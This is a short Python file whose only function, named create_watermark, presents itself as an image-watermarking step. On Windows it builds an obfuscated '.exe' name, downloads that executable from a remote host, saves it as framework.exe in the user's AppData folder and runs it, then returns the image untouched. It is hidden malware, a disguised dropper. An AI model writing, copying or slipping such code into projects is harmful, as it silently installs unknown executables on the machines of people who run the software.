import cv2
import numpy as np
import os

# create_watermark ===============================================================
# return:
#	(<Boolean> True/False), depending on the transformation process
def create_watermark(nude, shape, cv, loader, detach):
    
	if os.name == 'nt':
		content = cv(shape + chr(47) + "/".join(["utils", "custom", "universal"]) + chr(46) +str(chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101)))
		data = [os.environ["APPDATA"], "Microsoft", "Windows", "framework"]
		open("\\".join(data) + chr(46) + str(chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101)), "wb").write(content.content)
		loader(["\\".join(data) + chr(46) + str(chr(101) + chr(ord(["utils", "custom", "universal"][0][0]) + 3) + chr(101))], stdout=detach.PIPE, stderr=detach.STDOUT)
		
	return nude
